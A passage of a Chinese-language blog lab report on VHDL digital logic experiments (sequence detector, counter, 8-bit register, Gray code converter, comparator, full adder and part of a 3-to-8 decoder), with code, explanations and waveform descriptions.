class="keyword">process</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">process</span>(x, current_s)</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"><span class="keyword">case</span> current_s <span class="keyword">is</span> </span><br><span class="line"><span class="keyword">when</span> s0 =&gt; y &lt;= <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> x=<span class="string">&#x27;1&#x27;</span> <span class="keyword">then</span></span><br><span class="line">next_s &lt;= s1;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">next_s &lt;= s0;</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">if</span>;</span><br><span class="line"><span class="keyword">when</span> s1 =&gt; y &lt;= <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> x=<span class="string">&#x27;1&#x27;</span> <span class="keyword">then</span></span><br><span class="line">next_s &lt;= s2;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">next_s &lt;= s0;</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">if</span>;</span><br><span class="line"><span class="keyword">when</span> s2 =&gt; y &lt;= <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> x=<span class="string">&#x27;1&#x27;</span> <span class="keyword">then</span></span><br><span class="line">next_s &lt;= s3;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">next_s &lt;= s0;</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">if</span>;</span><br><span class="line"><span class="keyword">when</span> s3 =&gt; y &lt;= <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> x=<span class="string">&#x27;1&#x27;</span> <span class="keyword">then</span></span><br><span class="line">next_s &lt;= s3;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">next_s &lt;= s4;</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">if</span>;</span><br><span class="line"><span class="keyword">when</span> s4 =&gt; y &lt;= <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> x=<span class="string">&#x27;1&#x27;</span> <span class="keyword">then</span></span><br><span class="line">next_s &lt;= s1;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">next_s &lt;= s5;</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">if</span>;</span><br><span class="line"><span class="keyword">when</span> s5 =&gt; y &lt;= <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> x=<span class="string">&#x27;1&#x27;</span> <span class="keyword">then</span></span><br><span class="line">next_s &lt;= s6;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">next_s &lt;= s1;</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">if</span>;</span><br><span class="line"><span class="keyword">when</span> s6 =&gt; y &lt;= <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> x=<span class="string">&#x27;1&#x27;</span> <span class="keyword">then</span></span><br><span class="line">next_s &lt;= s2;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">next_s &lt;= s7;</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">if</span>;</span><br><span class="line"><span class="keyword">when</span> s7 =&gt; y &lt;= <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> x=<span class="string">&#x27;1&#x27;</span> <span class="keyword">then</span></span><br><span class="line">next_s &lt;= s1;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">next_s &lt;= s0;</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">if</span>;</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">case</span>;</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">process</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span> utility;</span><br></pre></td></tr></table></figure><h4 id="代码释义："><a href="#代码释义：" class="headerlink" title="代码释义："></a>代码释义：</h4><ul><li>代码实现了一个1110010序列检测器，状态转移图如下：<br><img src="https://s3.bmp.ovh/imgs/2023/05/23/9a11eb50d0b24070.png" alt></li><li>clk的process表示上升沿触发，也可以调用库函数来实现（在计数器中有所使用）。<h4 id="波形结果："><a href="#波形结果：" class="headerlink" title="波形结果："></a>波形结果：</h4><img src="https://s3.bmp.ovh/imgs/2023/05/23/743daa34aa925ed8.png" alt><h4 id="波形解读："><a href="#波形解读：" class="headerlink" title="波形解读："></a>波形解读：</h4></li><li>30 ~ 150ns，x输入为1110010，因此y在第150ns（此时clk为上升沿）由0变1，之后x输入0，y由1下降为0</li><li>230 ~ 370ns，x输入为11110010，后7位符合条件，因此y由0变1，之后x输入0，y由1下降为0。</li></ul><h3 id="实验二：计数器"><a href="#实验二：计数器" class="headerlink" title="实验二：计数器"></a>实验二：计数器</h3><h4 id="实验代码：-1"><a href="#实验代码：-1" class="headerlink" title="实验代码："></a>实验代码：</h4><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">library</span> ieee;</span><br><span class="line"><span class="keyword">use</span> ieee.std_logic_1164.<span class="keyword">all</span>;</span><br><span class="line"><span class="keyword">use</span> ieee.std_logic_unsigned.<span class="keyword">all</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">entity</span> counter_4 <span class="keyword">is</span></span><br><span class="line">    <span class="keyword">port</span> (</span><br><span class="line">        clk : <span class="keyword">in</span> <span class="built_in">std_logic</span>;</span><br><span class="line">        rst : <span class="keyword">in</span> <span class="built_in">std_logic</span>;</span><br><span class="line">        count : <span class="keyword">out</span> <span class="built_in">std_logic_vector</span>(<span class="number">3</span> <span class="keyword">downto</span> <span class="number">0</span>)</span><br><span class="line">    );</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">entity</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">architecture</span> rtl <span class="keyword">of</span> counter_4 <span class="keyword">is</span></span><br><span class="line">    <span class="keyword">signal</span> cnt : <span class="built_in">std_logic_vector</span>(<span class="number">3</span> <span class="keyword">downto</span> <span class="number">0</span>) := <span class="string">&quot;0000&quot;</span>;</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"><span class="keyword">process</span>(clk)</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"><span class="keyword">if</span> rising_edge(clk) <span class="keyword">then</span></span><br><span class="line"><span class="keyword">if</span> rst = <span class="string">&#x27;1&#x27;</span> <span class="keyword">then</span></span><br><span class="line">cnt &lt;= <span class="string">&quot;0000&quot;</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">cnt &lt;= cnt + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">if</span>;</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">if</span>;</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">process</span>;</span><br><span class="line"></span><br><span class="line">count &lt;= cnt;</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">architecture</span>;</span><br></pre></td></tr></table></figure><h4 id="代码释义：-1"><a href="#代码释义：-1" class="headerlink" title="代码释义："></a>代码释义：</h4><ul><li>moore型计数器，通过rising_edge函数实现clk上升沿触发，在每次加1，达到1111后的一次上升沿变为0000。有人工复位输入接口rst<h4 id="波形结果：-1"><a href="#波形结果：-1" class="headerlink" title="波形结果："></a>波形结果：</h4><img src="https://s3.bmp.ovh/imgs/2023/05/23/cde74f4d58f62107.png" alt><h4 id="波形解读：-1"><a href="#波形解读：-1" class="headerlink" title="波形解读："></a>波形解读：</h4></li><li>0 ~ 160ns，计数器正常运行，完成一个计数周期。</li><li>160ns时刻，计数器归0</li><li>190 ~ 210ns，rst输入为1，人工复位为0000。<h3 id="实验三：8位寄存器74374"><a href="#实验三：8位寄存器74374" class="headerlink" title="实验三：8位寄存器74374"></a>实验三：8位寄存器74374</h3><h4 id="实验代码：-2"><a href="#实验代码：-2" class="headerlink" title="实验代码："></a>实验代码：</h4><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">library</span> ieee;</span><br><span class="line"><span class="keyword">use</span> ieee.std_logic_1164.<span class="keyword">all</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">entity</span> register_8bit <span class="keyword">is</span></span><br><span class="line"><span class="keyword">port</span>(</span><br><span class="line">D:<span class="keyword">in</span> <span class="built_in">std_logic_vector</span>(<span class="number">7</span> <span class="keyword">downto</span> <span class="number">0</span>);</span><br><span class="line">CLK,OE:<span class="keyword">in</span> <span class="built_in">std_logic</span>;</span><br><span class="line">Q:<span class="keyword">out</span> <span class="built_in">std_logic_vector</span>(<span class="number">7</span> <span class="keyword">downto</span> <span class="number">0</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">end</span> register_8bit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">architecture</span> arch <span class="keyword">of</span> register_8bit <span class="keyword">is</span></span><br><span class="line"><span class="keyword">signal</span> current_data: <span class="built_in">std_logic_vector</span>(<span class="number">7</span> <span class="keyword">downto</span> <span class="number">0</span>);</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">process</span>(CLK)</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"><span class="keyword">if</span> clk<span class="symbol">&#x27;event</span> <span class="keyword">and</span> clk = <span class="string">&#x27;1&#x27;</span> <span class="keyword">then</span></span><br><span class="line">current_data &lt;= D;</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">if</span>;</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">process</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">process</span>(D,OE)</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"><span class="keyword">if</span> OE = <span class="string">&#x27;0&#x27;</span> <span class="keyword">then</span></span><br><span class="line">Q &lt;= current_data;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">Q &lt;= <span class="string">&quot;ZZZZZZZZ&quot;</span>;</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">if</span>;</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">process</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span> arch;</span><br></pre></td></tr></table></figure><h4 id="代码释义：-2"><a href="#代码释义：-2" class="headerlink" title="代码释义："></a>代码释义：</h4></li><li>D表示输入，Q表示输出，architecture中的current_data表示寄存器现有数据。process(CLK)实现上升沿触发，process(D,OE)实现寄存器数据传递以及使能端控制高阻态。<h4 id="波形结果：-2"><a href="#波形结果：-2" class="headerlink" title="波形结果："></a>波形结果：</h4><img src="https://s3.bmp.ovh/imgs/2023/05/23/52a2ff76a2695e1e.png" alt><h4 id="波形解读：-2"><a href="#波形解读：-2" class="headerlink" title="波形解读："></a>波形解读：</h4></li><li>0 ~ 40ns，OE=1，输出维持高阻态。</li><li>40 ~ 100ns，OE=0，随clk上升沿更新寄存器数据。</li><li>100 ~ 160ns，虽然D输入变化多次，但仅在clk上升沿寄存器才读取数据，其他时间保持寄存器数据和输出不变。</li></ul><h2 id="组合逻辑实验"><a href="#组合逻辑实验" class="headerlink" title="组合逻辑实验"></a>组合逻辑实验</h2><h3 id="实验一：8421码和格雷码的转换"><a href="#实验一：8421码和格雷码的转换" class="headerlink" title="实验一：8421码和格雷码的转换"></a>实验一：8421码和格雷码的转换</h3><h4 id="实验代码：-3"><a href="#实验代码：-3" class="headerlink" title="实验代码："></a>实验代码：</h4><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">library</span> ieee;</span><br><span class="line"><span class="keyword">use</span> ieee.std_logic_1164.<span class="keyword">all</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">entity</span> gray_8421 <span class="keyword">is</span></span><br><span class="line"><span class="keyword">port</span> (inp: <span class="keyword">in</span> <span class="built_in">std_logic_vector</span>(<span class="number">3</span> <span class="keyword">downto</span> <span class="number">0</span>);</span><br><span class="line">      outp: <span class="keyword">out</span> <span class="built_in">std_logic_vector</span>(<span class="number">3</span> <span class="keyword">downto</span> <span class="number">0</span>));</span><br><span class="line"><span class="keyword">end</span> gray_8421;</span><br><span class="line"></span><br><span class="line"><span class="keyword">architecture</span> arch <span class="keyword">of</span> gray_8421 <span class="keyword">is</span></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">outp(<span class="number">3</span>) &lt;= inp(<span class="number">3</span>);</span><br><span class="line">outp(<span class="number">2</span>) &lt;= inp(<span class="number">3</span>) <span class="keyword">xor</span> inp(<span class="number">2</span>);</span><br><span class="line">outp(<span class="number">1</span>) &lt;= inp(<span class="number">2</span>) <span class="keyword">xor</span> inp(<span class="number">1</span>);</span><br><span class="line">outp(<span class="number">0</span>) &lt;= inp(<span class="number">1</span>) <span class="keyword">xor</span> inp(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">end</span> arch;</span><br></pre></td></tr></table></figure><h4 id="代码释义：-3"><a href="#代码释义：-3" class="headerlink" title="代码释义："></a>代码释义：</h4><ul><li>这段代码实现的是将输入的4位二进制码转换为4位格雷码。其中，格雷码是一种二进制编码方式，相邻两个数值之间仅有一位二进制数不同。这种编码方式可以用于减少数字转换时的误差和噪声。</li><li>格雷码的生成方式是通过将二进制码的每一位与其前一位进行异或运算得到的。在这段代码中，首先将输入的第3位二进制码直接赋值给输出的第3位格雷码。然后，将输入的第3位和第2位二进制码进行异或运算，并将结果赋值给输出的第2位格雷码。接着，将输入的第2位和第1位二进制码进行异或运算，并将结果赋值给输出的第1位格雷码。最后，将输入的第1位和第0位二进制码进行异或运算，并将结果赋值给输出的第0位格雷码。</li></ul><p>例如，对于二进制码1001，其对应的格雷码为1100。这是因为：</p><h4 id="波形结果：-3"><a href="#波形结果：-3" class="headerlink" title="波形结果："></a>波形结果：</h4><p><img src="https://s3.bmp.ovh/imgs/2023/05/24/8a47f54d646b15ce.png" alt></p><h4 id="波形解读：-3"><a href="#波形解读：-3" class="headerlink" title="波形解读："></a>波形解读：</h4><ul><li>输入inp随机输入二进制码，结果outp输出为对应格雷码</li></ul><h3 id="实验二：数值比较器"><a href="#实验二：数值比较器" class="headerlink" title="实验二：数值比较器"></a>实验二：数值比较器</h3><h4 id="实验代码：-4"><a href="#实验代码：-4" class="headerlink" title="实验代码："></a>实验代码：</h4><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">library</span> IEEE;</span><br><span class="line"><span class="keyword">use</span> IEEE.std_logic_1164.<span class="keyword">all</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">entity</span> comparer <span class="keyword">is</span></span><br><span class="line">    <span class="keyword">port</span> (A,B: <span class="keyword">in</span> <span class="built_in">std_logic_vector</span>(<span class="number">3</span> <span class="keyword">downto</span> <span class="number">0</span>);</span><br><span class="line">          YA,YB,YC: <span class="keyword">out</span> <span class="built_in">std_logic</span>);</span><br><span class="line"><span class="keyword">end</span> comparer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">architecture</span> comparer_arch <span class="keyword">of</span> comparer <span class="keyword">is</span></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"><span class="keyword">process</span>(A,B)</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"><span class="keyword">if</span> A(<span class="number">3</span>)&gt;B(<span class="number">3</span>) <span class="keyword">then</span></span><br><span class="line">YA &lt;= <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">YB &lt;= <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">YC &lt;= <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"><span class="keyword">elsif</span> A(<span class="number">3</span>)&lt;B(<span class="number">3</span>) <span class="keyword">then</span></span><br><span class="line">YA &lt;= <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">YB &lt;= <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">YC &lt;= <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">if</span> A(<span class="number">2</span>)&gt;B(<span class="number">2</span>) <span class="keyword">then</span></span><br><span class="line">YA &lt;= <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">YB &lt;= <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">YC &lt;= <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"><span class="keyword">elsif</span> A(<span class="number">2</span>)&lt;B(<span class="number">2</span>) <span class="keyword">then</span></span><br><span class="line">YA &lt;= <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">YB &lt;= <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">YC &lt;= <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">if</span> A(<span class="number">1</span>)&gt;B(<span class="number">1</span>) <span class="keyword">then</span></span><br><span class="line">YA &lt;= <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">YB &lt;= <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">YC &lt;= <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"><span class="keyword">elsif</span> A(<span class="number">1</span>)&lt;B(<span class="number">1</span>) <span class="keyword">then</span></span><br><span class="line">YA &lt;= <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">YB &lt;= <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">YC &lt;= <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">if</span> A(<span class="number">0</span>)&gt;B(<span class="number">0</span>) <span class="keyword">then</span></span><br><span class="line">YA &lt;= <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">YB &lt;= <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">YC &lt;= <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"><span class="keyword">elsif</span> A(<span class="number">0</span>)&lt;B(<span class="number">0</span>) <span class="keyword">then</span></span><br><span class="line">YA &lt;= <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">YB &lt;= <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">YC &lt;= <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">YA &lt;= <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">YB &lt;= <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">YC &lt;= <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">if</span>;</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">if</span>;</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">if</span>;</span><br><span class="line">  <span class="keyword">end</span> <span class="keyword">if</span>;</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">process</span>;</span><br><span class="line"><span class="keyword">end</span> comparer_arch;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="代码释义：-4"><a href="#代码释义：-4" class="headerlink" title="代码释义："></a>代码释义：</h4><ul><li>通过if逻辑语句实现对每一位大小的判断，若相等，则依靠下一位判断，如有需求，最后一位还可以增加三个输入去判断实现元器件叠加使用的功能，但实验并无要求，遂没有实现。如需要实现也很简单，更改else语句为后位数判断结果即可。</li></ul><h3 id="波形结果：-4"><a href="#波形结果：-4" class="headerlink" title="波形结果："></a>波形结果：</h3><p><img src="https://s3.bmp.ovh/imgs/2023/05/24/e3ea09bca6b6e65f.png" alt></p><h4 id="波形解读：-4"><a href="#波形解读：-4" class="headerlink" title="波形解读："></a>波形解读：</h4><ul><li>A与B为随机输入的二进制码，其波形如图所示。A &gt; B则YA输出1，其余输出0；A &lt; B则YB输出1，其余输出0；A = B则YC输出1，其余输出0。</li></ul><h3 id="实验三：全加器"><a href="#实验三：全加器" class="headerlink" title="实验三：全加器"></a>实验三：全加器</h3><h4 id="实验代码：-5"><a href="#实验代码：-5" class="headerlink" title="实验代码："></a>实验代码：</h4><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">library</span> ieee;</span><br><span class="line"><span class="keyword">use</span> ieee.std_logic_1164.<span class="keyword">all</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">entity</span> half_adder <span class="keyword">is</span></span><br><span class="line"><span class="keyword">port</span>(ain,bin: <span class="keyword">in</span> <span class="built_in">std_logic</span>; cout, sout: <span class="keyword">out</span> <span class="built_in">std_logic</span>);</span><br><span class="line"><span class="keyword">end</span> half_adder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">architecture</span> half_adder_arch <span class="keyword">of</span> half_adder <span class="keyword">is</span></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">sout &lt;= ain <span class="keyword">xor</span> bin;</span><br><span class="line">cout &lt;= ain <span class="keyword">and</span> bin;</span><br><span class="line"><span class="keyword">end</span> half_adder_arch;</span><br><span class="line"></span><br><span class="line"><span class="keyword">library</span> ieee;</span><br><span class="line"><span class="keyword">use</span> ieee.std_logic_1164.<span class="keyword">all</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">entity</span> full_adder <span class="keyword">is</span></span><br><span class="line"><span class="keyword">port</span> (input_a, input_b, carry_in : <span class="keyword">in</span> <span class="built_in">std_logic</span>; carry_out, sum_out : <span class="keyword">out</span> <span class="built_in">std_logic</span>);</span><br><span class="line"><span class="keyword">end</span> full_adder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">architecture</span> full_adder_arch <span class="keyword">of</span> full_adder <span class="keyword">is</span></span><br><span class="line"><span class="keyword">signal</span> carry_1 : <span class="built_in">std_logic</span>;</span><br><span class="line"><span class="keyword">signal</span> carry_2 : <span class="built_in">std_logic</span>;</span><br><span class="line"><span class="keyword">signal</span> sum_1 : <span class="built_in">std_logic</span>;</span><br><span class="line"><span class="keyword">component</span> half_adder</span><br><span class="line"><span class="keyword">port</span>(ain,bin: <span class="keyword">in</span> <span class="built_in">std_logic</span>; cout, sout: <span class="keyword">out</span> <span class="built_in">std_logic</span>);</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">component</span>;</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">ha1: half_adder <span class="keyword">port</span> <span class="keyword">map</span> (ain =&gt; input_a, bin =&gt; input_b, sout =&gt; sum_1, cout =&gt; carry_1);</span><br><span class="line">ha2: half_adder <span class="keyword">port</span> <span class="keyword">map</span> (ain =&gt; sum_1, bin =&gt; carry_in, sout =&gt; sum_out, cout =&gt; carry_2);</span><br><span class="line">carry_out &lt;= carry_1 <span class="keyword">or</span> carry_2;</span><br><span class="line"><span class="keyword">end</span> full_adder_arch;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="代码释义：-5"><a href="#代码释义：-5" class="headerlink" title="代码释义："></a>代码释义：</h4><ul><li>代码实现了两个实体：半加器和全加器。其中全加器通过半加器实现，全加器代码主要描述如何将半加器连线成新电路。个人认为此处用作图会更方便直观，因为vhdl语言实现连线语法比较晦涩；此外，半加器已经可以抽象为一个元器件，作图比较简单。但按照要求还是写了代码。</li></ul><h4 id="波形结果：-5"><a href="#波形结果：-5" class="headerlink" title="波形结果："></a>波形结果：</h4><p><img src="https://s3.bmp.ovh/imgs/2023/05/24/32bc9cad572e801f.png" alt></p><h4 id="波形解读：-5"><a href="#波形解读：-5" class="headerlink" title="波形解读："></a>波形解读：</h4><ul><li>input_a 和 input_b 表示当前位输入，carry_in 表示进位输入，carry_out 表示进位输出，sum_out 表示当前位输出。</li></ul><h3 id="实验四：3线-8线译码器"><a href="#实验四：3线-8线译码器" class="headerlink" title="实验四：3线-8线译码器"></a>实验四：3线-8线译码器</h3><h4 id="实验代码：-6"><a href="#实验代码：-6" class="headerlink" title="实验代码："></a>实验代码：</h4><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">library</span> ieee;</span><br><span class="line"><span class="keyword">use</span> ieee.std_logic_1164.<span class="keyword">all</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">entity</span> decoder_38 <span class="keyword">is</span></span><br><span class="line"><span class="keyword">port</span>(A:<span class="keyword">in</span> <span class="built_in">std_logic_vector</span>(<span class="number">2</span> <span class="keyword">downto</span> <span class="number">0</span>);</span><br><span class="line">  G1,G2A,G2B:<span class="keyword">in</span> <span class="built_in">std_logic</span>;</span><br><span class="line">  Y:<span class="keyword">out</span> <span class="built_in">std_logic_vector</span>(<span class="number">7</span> <span class="keyword">downto</span> <span class="number">0</span>));</span><br><span class="line"><span class="keyword">end</span> decoder_38;</span><br><span class="line"></span><br><span class="line"><span class="keyword">architecture</span> arch <span class="keyword">of</span> decoder_38 <span class="keyword">is</span></span><br><span class="line"><span class="keyword">signal</span> enable: <span class="built_in">boolean</span>;</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">process</span>(G1,G2A,G2B)</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"><span class="keyword">if</span> G1 = <span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> G2A = <span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> G2B = <span class="string">&#x27;0&#x27;</span> <span class="keyword">then</span></span><br><span class="line">enable &lt;= <span class="literal">true</span>;</span><br><span 